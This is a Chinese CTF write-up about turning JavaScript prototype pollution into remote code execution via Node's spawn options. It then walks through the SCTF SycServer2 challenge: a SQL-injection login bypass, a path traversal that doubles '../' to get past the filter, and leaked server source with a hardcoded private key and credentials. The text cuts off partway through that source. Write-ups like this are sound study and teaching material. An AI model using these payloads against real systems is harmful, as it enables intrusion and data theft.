@@ -1,0 +1,607 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>前几天打了SCTF，发现其中有一道新版Js原型链污染题目很有趣，能够把Prototype Pollution提升到RCE，深入学习分析如下欢迎师傅们交流学习</p>
+<h2 data-content="1" id="15012f9c214e3ce42b291ef347165fc2">漏洞解析</h2>
+<p>首先先回顾一下基本的原型链污染，举例代码如下：</p>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">obj1</span> <span class="o">=</span> <span class="p">{};</span>
+<span class="nx">obj1</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">obj1</span><span class="p">.</span><span class="nx">x</span> <span class="o">===</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// true</span>
+<span class="kr">const</span> <span class="nx">obj2</span> <span class="o">=</span> <span class="p">{};</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">obj2</span><span class="p">.</span><span class="nx">x</span> <span class="o">===</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// true</span>
+</pre></div>
+<p>漏洞代码如下</p>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">execSync</span><span class="p">,</span> <span class="nx">fork</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">isObject</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">obj</span><span class="p">);</span>
+    <span class="k">return</span> <span class="k">typeof</span> <span class="nx">obj</span> <span class="o">===</span> <span class="s1">'function'</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">obj</span> <span class="o">===</span> <span class="s1">'object'</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Function vulnerable to prototype pollution</span>
+<span class="kd">function</span> <span class="nx">merge</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">source</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">source</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">isObject</span><span class="p">(</span><span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isObject</span><span class="p">(</span><span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">]))</span> <span class="p">{</span>
+            <span class="nx">merge</span><span class="p">(</span><span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">],</span> <span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">]);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">target</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">clone</span><span class="p">(</span><span class="nx">target</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">merge</span><span class="p">({},</span> <span class="nx">target</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nx">clone</span><span class="p">(</span><span class="nx">USERINPUT</span><span class="p">);</span>
+</pre></div>
+<h3 data-content="1" id="3a8c420c3d49117282600f752865a09b">spawn 命令的Prototype Pollution to RCE 分析</h3>
+<p>简单来说就是，<code>spawn</code> 函数通过对象接收可选参数：这可用于使用 env 属性为子进程设置环境变量。这可用于设置 NODE_OPTIONS 以便为 node 进程设置更多命令行参数。某些参数是不允许的，例如 <code>--eval</code>，但 <code>--require</code> 可用于包含任何文件。由于生成了新进程，因此文件系统上有一些新文件。文件 <code>/proc/self/environ</code> 包含当前进程的环境变量，这些变量已经通过 env 选项受到攻击者的控制。</p>
+<p>利用此功能的方法是在包含 JavaScript 代码并带有尾部注释的NODE_OPTIONS变量之前插入一个新的环境变量，以避免语法错误。但是问题在于，Node.js 现在始终将<code>NODE_OPTIONS</code>放在 environ 文件中的首位。</p>
+<h3 data-content="1" id="90dbb05df2240b9e01f5fa31f910380c">问题解决</h3>
+<p>要绕过这一点，我们可以用 <code>spawn</code>函数的另外两个参数：<code>argv0</code> 和 <code>shell</code>。第一个 <code>argv0</code>控制传递给新进程的参数列表中的第一个元素。通常，这等效于执行的二进制文件。整个参数列表都反映在文件 <code>/proc/self/cmdline</code> 中，因此第一个元素将位于开头。我们将 <code>NODE_OPTION</code>S 的值更改为 -<code>-require /proc/self/cmdline</code> 并将其有效负载放在 argv0 中即可</p>
+<p>但是由于第一个参数已更改，因此无法生成进程，因为它不是有效的命令或文件路径。这可以通过 <code>spawn</code> 函数的 <code>shell</code> 选项来绕过。可以将其设置为<strong>二进制文件的路径</strong>，然后使用该路径在<code>shell</code> 中生成命令。在 Linux 上，<code>shell</code> 会附加到命令及其参数的前面，如下所示：</p>
+<div class="highlight"><pre><span></span><span class="o">/</span>bin<span class="o">/</span>myshell <span class="o">-</span><span class="kt">c</span> “command arg1 arg2 arg3”
+</pre></div>
+<p>要设置<code>shell</code>为节点可执行文件的路径，攻击者可以在不知道实际路径的情况下使用<code>/proc/self/exe</code>，并执行自己设定的参数<code>argv0</code>如下所示：`</p>
+<div class="highlight"><pre><span></span><span class="nx">execve</span><span class="p">(</span><span class="s2">"/proc/self/exe"</span><span class="p">,</span> <span class="p">[</span><span class="s2">"console.log('pwned!');//"</span><span class="p">,</span> <span class="s2">"-c"</span><span class="p">,</span> <span class="s2">"node …"</span><span class="p">],</span> <span class="p">{</span> <span class="nx">NODE_OPTIONS</span><span class="o">:</span> <span class="s2">"--require /proc/self/cmdline"</span> <span class="p">})</span>
+</pre></div>
+<p>到此利用的spawn函数的PP2Rce分析完毕！</p>
+<h3 data-content="1" id="3cafa3d107793b8247acf161e0d16a86">Patch</h3>
+<p>其中漏洞修补方式是<code>Object.create(null)</code>,无论使用任何不受信任的属性名称进行访问，也无法访问该原型。而下面举例的SCTF的题目便是用此waf来防止原型链污染。</p>
+<pre><code>const obj = Object.create(null);
+Object.prototype.x = 1;
+console.log(obj.x === 1); // false
+console.log(obj.__proto__); // undefined</code></pre>
+<h3 data-content="1" id="fd121148dcd1593cb291b25978a8c9e4">SCTF SycServer2  PP2</h3>
+<p>题目前端是一个JSEncrypt，js里的waf改掉 然后直接'or'1万能密码登录</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241003135341-d7fba686-814b-1.png"/></p>
+<p>扫描目录发现robots.txt并且有文件包含漏洞</p>
+<div class="highlight"><pre><span></span><span class="o">----</span> <span class="n">Scanning</span> <span class="n">URL</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.95</span><span class="o">.</span><span class="mf">87.154</span><span class="p">:</span><span class="mi">35200</span><span class="o">/</span> <span class="o">----</span>
+<span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.95</span><span class="o">.</span><span class="mf">87.154</span><span class="p">:</span><span class="mi">35200</span><span class="o">/</span><span class="n">config</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">292</span><span class="p">)</span>
+<span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.95</span><span class="o">.</span><span class="mf">87.154</span><span class="p">:</span><span class="mi">35200</span><span class="o">/</span><span class="n">css</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">301</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">153</span><span class="p">)</span>
+<span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.95</span><span class="o">.</span><span class="mf">87.154</span><span class="p">:</span><span class="mi">35200</span><span class="o">/</span><span class="n">hello</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">403</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">31</span><span class="p">)</span>
+<span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.95</span><span class="o">.</span><span class="mf">87.154</span><span class="p">:</span><span class="mi">35200</span><span class="o">/</span><span class="n">img</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">301</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">153</span><span class="p">)</span>
+<span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.95</span><span class="o">.</span><span class="mf">87.154</span><span class="p">:</span><span class="mi">35200</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">html</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">4775</span><span class="p">)</span>
+<span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.95</span><span class="o">.</span><span class="mf">87.154</span><span class="p">:</span><span class="mi">35200</span><span class="o">/</span><span class="n">report</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">403</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">31</span><span class="p">)</span>
+<span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.95</span><span class="o">.</span><span class="mf">87.154</span><span class="p">:</span><span class="mi">35200</span><span class="o">/</span><span class="n">robots</span><span class="o">.</span><span class="n">txt</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">64</span><span class="p">)</span>
+<span class="n">User</span><span class="o">-</span><span class="n">agent</span><span class="p">:</span> <span class="o">*</span>
+<span class="n">Disallow</span><span class="p">:</span>
+<span class="n">Disallow</span><span class="p">:</span> <span class="o">/</span><span class="n">ExP0rtApi</span><span class="err">?</span><span class="n">v</span><span class="o">=</span><span class="n">static</span><span class="o">&amp;</span><span class="n">f</span><span class="o">=</span><span class="mf">1.j</span><span class="n">peg</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">1.95</span><span class="o">.</span><span class="mf">87.154</span><span class="p">:</span><span class="mi">35200</span><span class="o">/</span><span class="n">ExP0rtApi</span><span class="err">?</span><span class="n">v</span><span class="o">=.&amp;</span><span class="n">f</span><span class="o">=</span><span class="n">app</span><span class="o">.</span><span class="n">js</span>
+</pre></div>
+<p>并且替换<code>../</code>为空，双写绕过</p>
+<pre><code>http://1.95.83.156:30688/ExP0rtApi?v=static&amp;f=//....//....//....//....//....//....//....//app/app.js</code></pre>
+<p>读取源码app.js如下</p>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'fs'</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">nodeRsa</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'node-rsa'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'body-parser'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'jsonwebtoken'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'crypto'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">SECRET_KEY</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'path'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">zlib</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'zlib'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">mysql</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'mysql'</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">handle</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'./handle'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'cookie-parser'</span><span class="p">);</span>
+
+<span class="kr">const</span> <span class="nx">con</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">({</span>
+  <span class="nx">host</span><span class="o">:</span> <span class="s1">'localhost'</span><span class="p">,</span>
+  <span class="nx">user</span><span class="o">:</span> <span class="s1">'ctf'</span><span class="p">,</span>
+  <span class="nx">password</span><span class="o">:</span> <span class="s1">'ctf123123'</span><span class="p">,</span>
+  <span class="nx">port</span><span class="o">:</span> <span class="s1">'3306'</span><span class="p">,</span>
+  <span class="nx">database</span><span class="o">:</span> <span class="s1">'sctf'</span>
+<span class="p">})</span>
+<span class="nx">con</span><span class="p">.</span><span class="nx">connect</span><span class="p">((</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">'Error connecting to MySQL:'</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
+    <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">con</span><span class="p">.</span><span class="nx">connect</span><span class="p">(),</span> <span class="mi">2000</span><span class="p">);</span> <span class="c1">// 2秒后重试连接</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'Connected to MySQL'</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">});</span>
+
+<span class="kr">const</span> <span class="p">{</span><span class="nx">response</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"express"</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"express/lib/request"</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">nodeRsa</span><span class="p">({</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">1024</span> <span class="p">});</span>
+<span class="nx">key</span><span class="p">.</span><span class="nx">setOptions</span><span class="p">({</span> <span class="nx">encryptionScheme</span><span class="o">:</span> <span class="s1">'pkcs1'</span> <span class="p">});</span>
+
+<span class="kd">var</span> <span class="nx">publicPem</span> <span class="o">=</span> <span class="sb">`-----BEGIN PUBLIC KEY-----</span><span class="err">\</span><span class="sb">nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ</span><span class="err">\</span><span class="sb">nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC</span><span class="err">\</span><span class="sb">nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe</span><span class="err">\</span><span class="sb">nI+Atul1rSE0APhHoPwIDAQAB</span><span class="err">\</span><span class="sb">n-----END PUBLIC KEY-----`</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">privatePem</span> <span class="o">=</span> <span class="sb">`-----BEGIN PRIVATE KEY-----</span>
+<span class="sb">MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27</span>
+<span class="sb">PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l</span>
+<span class="sb">i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi</span>
+<span class="sb">6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI</span>
+<span class="sb">lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY</span>
+<span class="sb">Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61</span>
+<span class="sb">khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT</span>
+<span class="sb">6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78</span>
+<span class="sb">dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG</span>
+<span class="sb">mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye</span>
+<span class="sb">KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh</span>
+<span class="sb">UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l</span>
+<span class="sb">zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg</span>
+<span class="sb">xu/vfQ0A1jHRNC7t</span>
+<span class="sb">-----END PRIVATE KEY-----`</span><span class="p">;</span>
+
+<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">'static'</span><span class="p">)));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>
+
+<span class="kd">var</span> <span class="nx">Reportcache</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="kd">function</span> <span class="nx">verifyAdmin</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">[</span><span class="s1">'auth_token'</span><span class="p">];</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'No token provided'</span> <span class="p">});</span>
+  <span class="p">}</span>
+
+  <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">SECRET_KEY</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">decoded</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'Failed to authenticate token'</span> <span class="p">});</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">decoded</span><span class="p">.</span><span class="nx">role</span> <span class="o">!==</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'Access denied. Admins only.'</span> <span class="p">});</span>
+    <span class="p">}</span>
+
+    <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">decoded</span><span class="p">;</span>
+    <span class="nx">next</span><span class="p">();</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/hello'</span><span class="p">,</span> <span class="nx">verifyAdmin</span> <span class="p">,(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">'&lt;h1&gt;Welcome Admin!!!&lt;/h1&gt;&lt;br&gt;&lt;img src="./1.jpeg" /&gt;'</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/config'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
+    <span class="nx">publicKey</span><span class="o">:</span> <span class="nx">publicPem</span><span class="p">,</span>
+  <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="kd">var</span> <span class="nx">decrypt</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">pem</span> <span class="o">=</span> <span class="nx">privatePem</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">nodeRsa</span><span class="p">(</span><span class="nx">pem</span><span class="p">,</span> <span class="p">{</span>
+      <span class="nx">encryptionScheme</span><span class="o">:</span> <span class="s1">'pkcs1'</span><span class="p">,</span>
+      <span class="nx">b</span><span class="o">:</span> <span class="mi">1024</span>
+    <span class="p">});</span>
+    <span class="nx">key</span><span class="p">.</span><span class="nx">setOptions</span><span class="p">({</span> <span class="nx">environment</span><span class="o">:</span> <span class="s2">"browser"</span> <span class="p">});</span>
+    <span class="k">return</span> <span class="nx">key</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">(</span><span class="nx">body</span><span class="p">,</span> <span class="s1">'utf8'</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">"decrypt error"</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
+    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="kr">const</span> <span class="nx">encryptedPassword</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>
+  <span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
+
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="nx">passwd</span> <span class="o">=</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nx">encryptedPassword</span><span class="p">)</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">username</span> <span class="o">===</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kr">const</span> <span class="nx">sql</span> <span class="o">=</span> <span class="sb">`select (select password from user where username = 'admin') = '</span><span class="si">${</span><span class="nx">passwd</span><span class="si">}</span><span class="sb">';`</span>
+      <span class="nx">con</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">rows</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">rows</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">rows</span><span class="p">[</span><span class="mi">0</span><span class="p">])])</span> <span class="p">{</span>
+          <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span><span class="nx">username</span><span class="p">,</span> <span class="nx">role</span><span class="o">:</span> <span class="nx">username</span><span class="p">},</span> <span class="nx">SECRET_KEY</span><span class="p">,</span> <span class="p">{</span><span class="nx">expiresIn</span><span class="o">:</span> <span class="s1">'1h'</span><span class="p">});</span>
+          <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">'auth_token'</span><span class="p">,</span> <span class="nx">token</span><span class="p">,</span> <span class="p">{</span><span class="nx">secure</span><span class="o">:</span> <span class="kc">false</span><span class="p">});</span>
+          <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="nx">success</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'Login Successfully'</span><span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="nx">success</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'Errow Password!'</span><span class="p">});</span>
+        <span class="p">}</span>
+      <span class="p">});</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="nx">success</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'This Website Only Open for admin'</span><span class="p">});</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">success</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'Error decrypting password!'</span> <span class="p">});</span>
+  <span class="p">}</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/ExP0rtApi'</span><span class="p">,</span> <span class="nx">verifyAdmin</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">rootpath</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">v</span><span class="p">;</span>
